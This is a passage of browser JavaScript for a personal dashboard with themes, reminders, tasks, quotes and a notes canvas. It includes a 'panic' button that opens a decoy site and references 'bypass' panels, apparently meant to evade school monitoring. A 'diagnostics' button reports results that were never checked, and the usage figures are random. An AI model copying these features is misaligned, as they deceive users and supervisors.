                localStorage.setItem('accentColor', dashboard.settings.currentAccentColor);
                dashboard.applyThemeSettings();
                document.querySelectorAll('.color-box').forEach(box => box.classList.remove('selected'));
                document.querySelector(`.color-box[data-color="#ff914d"]`).classList.add('selected');
            });

            // Mark current accent color as selected
            const selectedColorBox = document.querySelector(`.color-box[data-color="${dashboard.settings.currentAccentColor}"]`);
            if (selectedColorBox) {
                selectedColorBox.classList.add('selected');
            } else {
                // If a custom/unlisted color is set, default to original orange selected
                document.querySelector(`.color-box[data-color="#ff914d"]`).classList.add('selected');
            }

            // Save panel visibility button
            document.getElementById('savePanelVisibilityBtn').addEventListener('click', () => {
                document.querySelectorAll('#panelVisibilitySettings input[type="checkbox"]').forEach(checkbox => {
                    dashboard.settings.panelVisibility[checkbox.id.replace('toggle', '').replace('Panel', '') + 'Panel'] = checkbox.checked;
                });
                localStorage.setItem('panelVisibility', JSON.stringify(dashboard.settings.panelVisibility));
                alert('Panel visibility preferences saved!');
            });

            console.log("Settings panel initialized.");
        }
      },

      // --- Theme and Display Application ---
      loadSettings: function() {
        // Load theme preference from local storage
        this.settings.isLightTheme = JSON.parse(localStorage.getItem('isLightTheme') ?? 'false');
        // Load accent color
        this.settings.currentAccentColor = localStorage.getItem('accentColor') || '#ff914d';
        // Load animations preference
        this.settings.animationsEnabled = JSON.parse(localStorage.getItem('animationsEnabled') ?? 'true');
        // Load font size
        this.settings.fontSize = parseInt(localStorage.getItem('fontSize') || '16');
        // Load panel visibility
        this.settings.panelVisibility = JSON.parse(localStorage.getItem('panelVisibility') || '{}');

        console.log("Settings loaded.");
      },

      applyThemeSettings: function() {
        const body = document.body;
        const themeToggleBtn = document.getElementById('themeToggle');

        // Apply light/dark theme class
        if (this.settings.isLightTheme) {
            body.classList.add('light-theme');
            themeToggleBtn.innerText = '☀️ Light Mode';
        } else {
            body.classList.remove('light-theme');
            themeToggleBtn.innerText = '🌙 Dark Mode';
        }

        // Apply accent color
        const accentColor = this.settings.currentAccentColor;
        const root = document.documentElement;
        root.style.setProperty('--accent-color', accentColor);
        // Calculate lighter/darker shades for other accent variables
        root.style.setProperty('--accent-light', this.lightenColor(accentColor, 20));
        root.style.setProperty('--accent-dark', this.darkenColor(accentColor, 20));

        // Update theme toggle checkbox in settings panel
        const themeToggleSettingsCheckbox = document.getElementById('themeToggleSettings');
        if (themeToggleSettingsCheckbox) {
            themeToggleSettingsCheckbox.checked = this.settings.isLightTheme;
        }

        // Apply animations setting
        if (this.settings.animationsEnabled) {
            body.classList.remove('animations-disabled');
        } else {
            body.classList.add('animations-disabled');
        }

        // Apply font size
        root.style.setProperty('--base-font-size', `${this.settings.fontSize}px`);
        const currentFontSizeSpan = document.getElementById('currentFontSize');
        if (currentFontSizeSpan) {
            currentFontSizeSpan.textContent = `${this.settings.fontSize}px`;
        }

        console.log(`Theme applied: Light Mode = ${this.settings.isLightTheme}, Accent = ${accentColor}, Animations = ${this.settings.animationsEnabled}, Font Size = ${this.settings.fontSize}px`);
      },

      // Helper functions for color manipulation
      lightenColor: function(hex, percent) {
        let f = parseInt(hex.slice(1), 16), R = f >> 16, G = (f >> 8) & 0x00ff, B = f & 0x0000ff;
        R = Math.min(255, R + (255 - R) * percent / 100) | 0;
        G = Math.min(255, G + (255 - G) * percent / 100) | 0;
        B = Math.min(255, B + (255 - B) * percent / 100) | 0;
        return "#" + (0x1000000 + (R << 16) + (G << 8) + B).toString(16).slice(1);
      },

      darkenColor: function(hex, percent) {
        let f = parseInt(hex.slice(1), 16), R = f >> 16, G = (f >> 8) & 0x00ff, B = f & 0x0000ff;
        R = Math.max(0, R - R * percent / 100) | 0;
        G = Math.max(0, G - G * percent / 100) | 0;
        B = Math.max(0, B - B * percent / 100) | 0;
        return "#" + (0x1000000 + (R << 16) + (G << 8) + B).toString(16).slice(1);
      },

      // --- Existing Dashboard Functions (Enhanced) ---

      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        setInterval(updateSessionTime, 1000);
        console.log("Session timer initialized.");
      },
      
      // Initialize real-time clock
      initClock: function() {
        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }
        
        updateClock();
        setInterval(updateClock, 1000);
        console.log("Real-time clock initialized.");
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        if (!calendar) return; // Ensure calendar element exists
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
        console.log("Calendar generated.");
      },
      
      // Initialize theme toggle (quick bar button)
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
          this.settings.isLightTheme = !this.settings.isLightTheme;
          localStorage.setItem('isLightTheme', this.settings.isLightTheme);
          this.applyThemeSettings();
        });
        this.applyThemeSettings(); // Apply initial theme state
        console.log("Theme toggle initialized.");
      },
      
      // Initialize general dashboard buttons
      initButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          window.open('https://clever.com', '_blank'); // Opens a safe tab
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)? This will erase unsaved notes!')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:var(--primary-bg); color:var(--text-color); font-family:var(--font-family); font-size:24px;">Page has been killed. Restart to continue.</div>`;
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          alert('Running diagnostics...\nNo critical issues detected. Your dashboard is running smoothly!');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              alert(`Error attempting to enable full-screen mode: ${err.message}`);
            });
          } else {
            document.exitFullscreen();
          }
        });
        
        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = zoomLevel;
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = zoomLevel;
          }
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to log out?')) {
                // Perform logout actions (e.g., clear session storage, redirect)
                window.location.reload(); // Simple reload for demonstration
            }
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications');
        toggleBtn.addEventListener('click', () => {
          if (mainGrid.style.display === 'none') {
            mainGrid.style.display = 'flex';
            updatesNotifications.style.display = 'flex';
            toggleBtn.innerText = '⬆️ Toggle Sections';
          } else {
            mainGrid.style.display = 'none';
            updatesNotifications.style.display = 'none';
            toggleBtn.innerText = '⬇️ Toggle Sections';
          }
        });
        console.log("General buttons initialized.");
      },
      
      // Initialize canvas for notes
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications');

        notesBtn.addEventListener('click', () => {
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none';
          canvasContainer.style.display = 'block';
          // Close all other panels when notes canvas is opened
          document.querySelectorAll('.info-panel').forEach(panel => {
            panel.style.display = 'none';
          });
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex';
          updatesNotifications.style.display = 'flex';
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        let drawing = false;

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          return {
            x: (evt.clientX || evt.touches[0].clientX) - rect.left,
            y: (evt.clientY || evt.touches[0].clientY) - rect.top
          };
        }

        canvas.addEventListener('mousedown', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = getComputedStyle(document.documentElement).getPropertyValue('--accent-color'); // Use accent color for drawing
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = getComputedStyle(document.documentElement).getPropertyValue('--accent-color');
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            drawing = false;
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.getElementById('dashboard'); // Capture entire dashboard
          html2canvas(elementToCapture, { scale: 2 }).then(canvasImg => { // Increase scale for higher quality
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            alert('Screenshot captured and downloaded!');
          }).catch(err => {
              console.error("Error taking screenshot:", err);
              alert('Failed to capture screenshot. Please try again.');
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          alert('Notes canvas exported as image!');
        });
        console.log("Canvas for notes initialized.");
      },
      
      // Initialize visibility for all info panels
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        console.log("All info panels set to hidden initially.");
      },
      
      // Initialize quick bar - no new specific logic needed here beyond what initButtons handles
      initQuickBar: function() {
        console.log("Quick bar initialized (buttons handled elsewhere).");
      },

      // Panel toggle functions
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        const currentDisplay = panel.style.display;
        
        // Hide all other info panels
        document.querySelectorAll('.info-panel').forEach(p => {
            if (p.id !== panelId) {
                p.style.display = 'none';
            }
        });
        // Hide canvas if visible
        document.getElementById('canvasContainer').style.display = 'none';
        // Ensure main grid is visible when a panel is toggled
        document.getElementById('mainGrid').style.display = 'flex';
        document.getElementById('updatesNotifications').style.display = 'flex';


        // Toggle the target panel
        panel.style.display = currentDisplay === 'none' ? 'block' : 'none';
        console.log(`Panel '${panelId}' toggled to ${panel.style.display}.`);
      },
      
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        console.log(`iPad content '${contentId}' shown.`);
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        console.log(`Bypass content '${contentId}' shown.`);
      },

      // --- New Dashboard Features ---

      // Reminder System
      reminders: {
        allReminders: [], // Array to hold reminder objects
        reminderListElement: null, // Reference to the UL element

        init: function() {
          console.log("Reminder system initializing...");
          this.reminderListElement = document.getElementById('reminderList');
          document.getElementById('addReminderBtn').addEventListener('click', () => this.addReminder());
          // Load reminders from local storage on startup
          this.loadReminders();
          // Periodically check for due reminders
          setInterval(() => this.checkReminders(), 60 * 1000); // Check every minute
          // Request notification permission
          if (Notification.permission !== 'granted' && Notification.permission !== 'denied') {
            Notification.requestPermission();
          }
          console.log("Reminder system initialized.");
        },

        loadReminders: function() {
          const storedReminders = localStorage.getItem('dashboardReminders');
          if (storedReminders) {
            this.allReminders = JSON.parse(storedReminders);
            this.renderReminders();
          }
          console.log("Reminders loaded from local storage.");
        },

        saveReminders: function() {
          localStorage.setItem('dashboardReminders', JSON.stringify(this.allReminders));
          console.log("Reminders saved to local storage.");
        },

        renderReminders: function() {
          this.reminderListElement.innerHTML = ''; // Clear existing list
          this.allReminders
            .sort((a, b) => new Date(a.dateTime) - new Date(b.dateTime)) // Sort by date/time
            .forEach(reminder => {
              const listItem = document.createElement('li');
              listItem.classList.add('reminder-item');
              if (reminder.completed) listItem.classList.add('completed');
              listItem.dataset.id = reminder.id;

              const reminderDateTime = new Date(reminder.dateTime);
              const formattedDate = reminderDateTime.toLocaleDateString();
              const formattedTime = reminderDateTime.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

              listItem.innerHTML = `
                <div>
                  <strong>${reminder.text}</strong>
                  <span>${formattedDate} at ${formattedTime}</span>
                </div>
                <div class="reminder-controls">
                  <button data-action="toggle">✅</button>
                  <button data-action="delete">❌</button>
                </div>
              `;
              
              this.reminderListElement.appendChild(listItem);
            });
            console.log("Reminders rendered to UI.");
        },

        addReminder: function() {
          const textInput = document.getElementById('reminderText');
          const dateInput = document.getElementById('reminderDate');
          const timeInput = document.getElementById('reminderTime');

          const text = textInput.value.trim();
          const date = dateInput.value;
          const time = timeInput.value;

          if (!text || !date || !time) {
            alert('Please enter reminder text, date, and time.');
            return;
          }

          const newReminder = {
            id: Date.now(), // Unique ID for the reminder
            text: text,
            dateTime: new Date(`${date}T${time}`).toISOString(),
            completed: false
          };

          this.allReminders.push(newReminder);
          this.saveReminders();
          this.renderReminders();

          // Clear form fields
          textInput.value = '';
          dateInput.value = '';
          timeInput.value = '';

          // Schedule notification if permission is granted
          this.scheduleNotification(newReminder);
          console.log(`Reminder '${text}' added.`);
        },

        handleReminderAction: function(event) {
          const button = event.target;
          const listItem = button.closest('.reminder-item');
          if (!listItem) return;

          const reminderId = parseInt(listItem.dataset.id);
          const action = button.dataset.action;

          const reminderIndex = this.allReminders.findIndex(r => r.id === reminderId);
          if (reminderIndex === -1) return;

          if (action === 'toggle') {
            this.allReminders[reminderIndex].completed = !this.allReminders[reminderIndex].completed;
            console.log(`Reminder ID ${reminderId} toggled completion.`);
          } else if (action === 'delete') {
            if (confirm('Are you sure you want to delete this reminder?')) {
              this.allReminders.splice(reminderIndex, 1);
              console.log(`Reminder ID ${reminderId} deleted.`);
            }
          }
          this.saveReminders();
          this.renderReminders();
        },

        checkReminders: function() {
          const now = new Date();
          this.allReminders.forEach(reminder => {
            if (!reminder.completed && new Date(reminder.dateTime) <= now) {
              this.showNotification(reminder);
              reminder.completed = true; // Mark as completed after notification
            }
          });
          this.saveReminders();
          this.renderReminders();
          console.log("Checked for due reminders.");
        },

        scheduleNotification: function(reminder) {
            if (Notification.permission === 'granted') {
                const reminderTime = new Date(reminder.dateTime).getTime();
                const now = Date.now();
                const delay = reminderTime - now;

                if (delay > 0) {
                    setTimeout(() => {
                        this.showNotification(reminder);
                        reminder.completed = true;
                        this.saveReminders();
                        this.renderReminders();
                    }, delay);
                    console.log(`Notification scheduled for reminder ID ${reminder.id}.`);
                } else if (delay <= 0 && !reminder.completed) {
                    // If reminder is already due, show immediately
                    this.showNotification(reminder);
                    reminder.completed = true;
                    this.saveReminders();
                    this.renderReminders();
                }
            } else {
                console.warn("Notification permission not granted, cannot schedule notification.");
            }
        },

        showNotification: function(reminder) {
            if (Notification.permission === 'granted') {
                new Notification('Reminder!', {
                    body: reminder.text,
                    icon: 'https://cdn-icons-png.flaticon.com/512/3233/3233512.png' // Generic reminder icon
                });
                console.log(`Notification shown for reminder ID ${reminder.id}.`);
            }
        }
      },

      // Daily Quote Generator
      quotes: {
        quoteDisplayElement: null,
        quoteAuthorElement: null,
        newQuoteButton: null,
        quoteIndex: 0,
        allQuotes: [
          { text: "The only way to do great work is to love what you do.", author: "Steve Jobs" },
          { text: "Success is not final, failure is not fatal: It is the courage to continue that counts.", author: "Winston Churchill" },
          { text: "The future belongs to those who believe in the beauty of their dreams.", author: "Eleanor Roosevelt" },
          { text: "Strive not to be a success, but rather to be of value.", author: "Albert Einstein" },
          { text: "The best way to predict the future is to create it.", author: "Peter Drucker" },
          { text: "Believe you can and you're halfway there.", author: "Theodore Roosevelt" },
          { text: "Your time is limited, don't waste it living someone else's life.", author: "Steve Jobs" },
          { text: "The mind is everything. What you think you become.", author: "Buddha" },
          { text: "Eighty percent of success is showing up.", author: "Woody Allen" },
          { text: "The only limit to our realization of tomorrow will be our doubts of today.", author: "Franklin D. Roosevelt" },
          { text: "It is during our darkest moments that we must focus to see the light.", author: "Aristotle" },
          { text: "Happiness is not something ready-made. It comes from your own actions.", author: "Dalai Lama" },
          { text: "Optimism is the faith that leads to achievement. Nothing can be done without hope and confidence.", author: "Helen Keller" },
          { text: "The true entrepreneur is a doer, not a dreamer.", author: "Nolan Bushnell" },
          { text: "To be yourself in a world that is constantly trying to make you something else is the greatest accomplishment.", author: "Ralph Waldo Emerson" },
          { text: "What you get by achieving your goals is not as important as what you become by achieving your goals.", author: "Zig Ziglar" },
          { text: "Don’t count the days, make the days count.", author: "Muhammad Ali" },
          { text: "The only impossible journey is the one you never begin.", author: "Tony Robbins" },
          { text: "Go confidently in the direction of your dreams! Live the life you've imagined.", author: "Henry David Thoreau" },
          { text: "The journey of a thousand miles begins with a single step.", author: "Lao Tzu" },
          { text: "I find that the harder I work, the more luck I seem to have.", author: "Thomas Jefferson" },
          { text: "The future belongs to the competent. Get good, get better, be the best!", author: "Brian Tracy" },
          { text: "Develop success from failures. Discouragement and failure are two of the surest stepping stones to success.", author: "Dale Carnegie" },
          { text: "The starting point of all achievement is desire.", author: "Napoleon Hill" },
          { text: "Action is the foundational key to all success.", author: "Pablo Picasso" },
          { text: "The man who has confidence in himself gains the confidence of others.", author: "Hasidic Proverb" },
          { text: "Don't be afraid to give up the good to go for the great.", author: "John D. Rockefeller" },
          { text: "You miss 100% of the shots you don't take.", author: "Wayne Gretzky" },
          { text: "The mind is its own place, and in itself can make a heaven of hell, a hell of heaven.", author: "John Milton" },
          { text: "Tough times never last, but tough people do.", author: "Robert H. Schuller" },
          { text: "Keep your eyes on the stars, and your feet on the ground.", author: "Theodore Roosevelt" },
          { text: "Spread love everywhere you go. Let no one ever come to you without leaving happier.", author: "Mother Teresa" },
          { text: "The only person you are destined to become is the person you decide to be.", author: "Ralph Waldo Emerson" },
          { text: "If you want to lift yourself up, lift up someone else.", author: "Booker T. Washington" },
          { text: "Setting goals is the first step in turning the invisible into the visible.", author: "Tony Robbins" },
          { text: "The harder the conflict, the greater the triumph.", author: "Thomas Paine" },
          { text: "I have not failed. I've just found 10,000 ways that won't work.", author: "Thomas A. Edison" },
          { text: "Happiness is not by chance, but by choice.", author: "Jim Rohn" },
          { text: "The best revenge is massive success.", author: "Frank Sinatra" },
          { text: "What we achieve inwardly will change outer reality.", author: "Plutarch" },
          { text: "If opportunity doesn't knock, build a door.", author: "Milton Berle" },
          { text: "The only way to achieve the impossible is to believe it is possible.", author: "Charles Kingsleigh" },
          { text: "You are never too old to set another goal or to dream a new dream.", author: "C.S. Lewis" },
          { text: "Believe in yourself and all that you are. Know that there is something inside you that is greater than any obstacle.", author: "Christian D. Larson" },
          { text: "The future depends on what you do today.", author: "Mahatma Gandhi" },
          { text: "It does not matter how slowly you go as long as you do not stop.", author: "Confucius" },
          { text: "Quality is not an act, it is a habit.", author: "Aristotle" },
          { text: "If your actions inspire others to dream more, learn more, do more and become more, you are a leader.", author: "John Quincy Adams" },
          { text: "The secret of getting ahead is getting started.", author: "Mark Twain" },
          { text: "Don’t wish it were easier, wish you were better.", author: "Jim Rohn" },
          { text: "Live as if you were to die tomorrow. Learn as if you were to live forever.", author: "Mahatma Gandhi" },
          { text: "The only source of knowledge is experience.", author: "Albert Einstein" },
          { text: "The only true wisdom is in knowing you know nothing.", author: "Socrates" },
          { text: "Never give up on a dream just because of the time it will take to accomplish it. The time will pass anyway.", author: "Earl Nightingale" },
          { text: "Success usually comes to those who are too busy to be looking for it.", author: "Henry David Thoreau" },
          { text: "You must be the change you wish to see in the world.", author: "Mahatma Gandhi" },
          { text: "What you do today can improve all your tomorrows.", author: "Ralph Marston" },
          { text: "The two most important days in your life are the day you are born and the day you find out why.", author: "Mark Twain" },
          { text: "The only place where success comes before work is in the dictionary.", author: "Vidal Sassoon" },
          { text: "The greatest glory in living lies not in never falling, but in rising every time we fall.", author: "Nelson Mandela" },
          { text: "Our greatest weakness lies in giving up. The most certain way to succeed is always to try just one more time.", author: "Thomas A. Edison" },
          { text: "To handle yourself, use your head; to handle others, use your heart.", author: "Eleanor Roosevelt" },
          { text: "It is better to fail in originality than to succeed in imitation.", author: "Herman Melville" },
          { text: "The function of leadership is to produce more leaders, not more followers.", author: "Ralph Nader" },
          { text: "Do not wait for leaders; do it alone, person to person.", author: "Mother Teresa" },
          { text: "If your ship doesn’t come in, swim out to meet it.", author: "Jonathan Winters" },
          { text: "The only person you should try to be better than is the person you were yesterday.", author: "Unknown" },
          { text: "Nothing is impossible, the word itself says 'I'm possible'!", author: "Audrey Hepburn" }
        ],

        init: function() {
          console.log("Daily quote generator initializing...");
          this.quoteDisplayElement = document.getElementById('quoteDisplay');
          this.quoteAuthorElement = document.getElementById('quoteAuthor');
          this.newQuoteButton = document.getElementById('newQuoteBtn');

          this.newQuoteButton.addEventListener('click', () => this.displayRandomQuote());
          this.displayRandomQuote(); // Display a quote on initial load
          console.log("Daily quote generator initialized.");
        },

        displayRandomQuote: function() {
            if (this.allQuotes.length === 0) {
                this.quoteDisplayElement.textContent = "No quotes available.";
                this.quoteAuthorElement.textContent = "";
                return;
            }
            this.quoteIndex = Math.floor(Math.random() * this.allQuotes.length);
            const quote = this.allQuotes[this.quoteIndex];
            this.quoteDisplayElement.textContent = `"${quote.text}"`;
            this.quoteAuthorElement.textContent = `- ${quote.author}`;
            console.log(`Displayed quote: "${quote.text}" by ${quote.author}.`);
        }
      },

      // Simulated System Diagnostics
      systemDiagnostics: {
        cpuUsageElement: null,
        ramUsageElement: null,
        diskUsageElement: null,
        networkSpeedElement: null,
        cpuBar: null,
        ramBar: null,
        diskBar: null,
        networkBar: null,

        init: function() {
            console.log("Simulated system diagnostics initializing...");
            this.cpuUsageElement = document.getElementById('cpuUsage');
            this.ramUsageElement = document.getElementById('ramUsage');
            this.diskUsageElement = document.getElementById('diskUsage');
            this.networkSpeedElement = document.getElementById('networkSpeed');
            this.cpuBar = document.getElementById('cpuBar');
            this.ramBar = document.getElementById('ramBar');
            this.diskBar = document.getElementById('diskBar');
            this.networkBar = document.getElementById('networkBar');

            this.updateDiagnostics(); // Initial update
            setInterval(() => this.updateDiagnostics(), 3000); // Update every 3 seconds
            console.log("Simulated system diagnostics initialized.");
        },

        generateRandomUsage: function(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        },

        updateProgressBar: function(barElement, value) {
            barElement.style.width = `${value}%`;
            barElement.classList.remove('warning', 'danger');
            if (value > 80) {
                barElement.classList.add('danger');
            } else if (value > 60) {
                barElement.classList.add('warning');
            }
        },

        updateDiagnostics: function() {
            const cpu = this.generateRandomUsage(10, 95);
            const ram = this.generateRandomUsage(20, 85);
            const disk = this.generateRandomUsage(30, 90);
            const network = this.generateRandomUsage(50, 500); // Mbps

            this.cpuUsageElement.textContent = `${cpu}%`;
            this.ramUsageElement.textContent = `${ram}%`;
            this.diskUsageElement.textContent = `${disk}%`;
            this.networkSpeedElement.textContent = `${network} Mbps`;

            this.updateProgressBar(this.cpuBar, cpu);
            this.updateProgressBar(this.ramBar, ram);
            this.updateProgressBar(this.diskBar, disk);
            this.updateProgressBar(this.networkBar, network / 5); // Scale network to 100 for bar

            const cpuStatus = cpu > 90 ? 'Critical' : (cpu > 70 ? 'High' : 'Normal');
            const ramStatus = ram > 80 ? 'Warning' : (ram > 60 ? 'Moderate' : 'Optimal');
            const diskStatus = disk > 85 ? 'Full' : (disk > 70 ? 'Near Full' : 'Healthy');
            const networkStatus = network > 300 ? 'Very Fast' : (network > 100 ? 'Fast' : 'Moderate');

            this.cpuUsageElement.nextElementSibling.nextElementSibling.textContent = cpuStatus; // Update status text
            this.ramUsageElement.nextElementSibling.nextElementSibling.textContent = ramStatus;
            this.diskUsageElement.nextElementSibling.nextElementSibling.textContent = diskStatus;
            this.networkSpeedElement.nextElementSibling.nextElementSibling.textContent = networkStatus;
            console.log("Simulated system diagnostics updated.");
        }
      },

      // Task Manager
      taskManager: {
        allTasks: [],
        taskListElement: null,

        init: function() {
            console.log("Task manager initializing...");
            this.taskListElement = document.getElementById('taskList');
            document.getElementById('addTaskBtn').addEventListener('click', () => this.addTask());
            this.taskListElement.addEventListener('click', (e) => this.handleTaskAction(e));
            this.loadTasks();
            console.log("Task manager initialized.");
        },

        loadTasks: function() {
            const storedTasks = localStorage.getItem('dashboardTasks');
            if (storedTasks) {
                this.allTasks = JSON.parse(storedTasks);
                this.renderTasks();
            }
            console.log("Tasks loaded from local storage.");
        },

        saveTasks: function() {
            localStorage.setItem('dashboardTasks', JSON.stringify(this.allTasks));
            console.log("Tasks saved to local storage.");
        },

        renderTasks: function() {
            this.taskListElement.innerHTML = '';
            this.allTasks
                .sort((a, b) => new Date(a.dueDate) - new Date(b.dueDate))
                .forEach(task => {
                    const listItem = document.createElement('li');
                    listItem.classList.add('task-item');
                    if (task.completed) listItem.classList.add('completed');
                    listItem.dataset.id = task.id;

                    const dueDate = new Date(task.dueDate);
                    const formattedDate = dueDate.toLocaleDateString();

                    listItem.innerHTML = `
                        <div class="task-content">
                            <span class="task-title">${task.text}</span>
                            <span class="task-details">Due: ${formattedDate} | Priority: ${task.priority.toUpperCase()}</span>
                        </div>
                        <div class="task-controls">
                            <button data-action="toggle">✅</button>
                            <button data-action="delete">❌</button>
                        </div>
                    `;
                    this.taskListElement.appendChild(listItem);
                });
            console.log("Tasks rendered to UI.");
        },

        addTask: function() {
            const textInput = document.getElementById('taskText');
            const dueDateInput = document.getElementById('taskDueDate');
            const prioritySelect = document.getElementById('taskPriority');

            const text = textInput.value.trim();
            const dueDate = dueDateInput.value;
            const priority = prioritySelect.value;

            if (!text || !dueDate) {
                alert('Please enter task text and a due date.');
                return;
            }

            const newTask = {
                id: Date.now(),
                text: text,
                dueDate: new Date(dueDate).toISOString().split('T')[0], // Store as YYYY-MM-DD
                priority: priority,
                completed: false
            };

            this.allTasks.push(newTask);
            this.saveTasks();
            this.renderTasks();

            textInput.value = '';
            dueDateInput.value = '';
            prioritySelect.value = 'low';
            console.log(`Task '${text}' added.`);
        },

        handleTaskAction: function(event) {
            const button = event.target;
            const listItem = button.closest('.task-item');
            if (!listItem) return;

            const taskId = parseInt(listItem.dataset.id);
            const action = button.dataset.action;

            const taskIndex = this.allTasks.findIndex(t => t.id === taskId);
            if (taskIndex === -1) return;

            if (action === 'toggle') {
                this.allTasks[taskIndex].completed = !this.allTasks[taskIndex].completed;
                console.log(`Task ID ${taskId} toggled completion.`);
            } else if (action === 'delete') {
                if (confirm('Are you sure you want to delete this task?')) {
                    this.allTasks.splice(taskIndex, 1);
                    console.log(`Task ID ${taskId} deleted.`);
                }
            }
            this.saveTasks();
            this.renderTasks();
        }
      },

      // Virtual Assistant
      virtualAssistant: {
        chatBox: null,
        chatInput: null,
        sendChatBtn: null,

        init: function() {
            console.log("Virtual assistant initializing...");
            this.chatBox = document.getElementById('chatBox');
            this.chatInput = document.getElementById('chatInput');
            this.sendChatBtn = document.getElementById('sendChatBtn');

            this.sendChatBtn.addEventListener('click', () => this.sendMessage());
            this.chatInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    this.sendMessage();
                }
            });
            console.log("Virtual assistant initialized.");
        },

        addMessage: function(text, sender) {
            const messageDiv = document.createElement('div');
            messageDiv.classList.add('chat-message', sender);
            messageDiv.textContent = text;
            this.chatBox.appendChild(messageDiv);
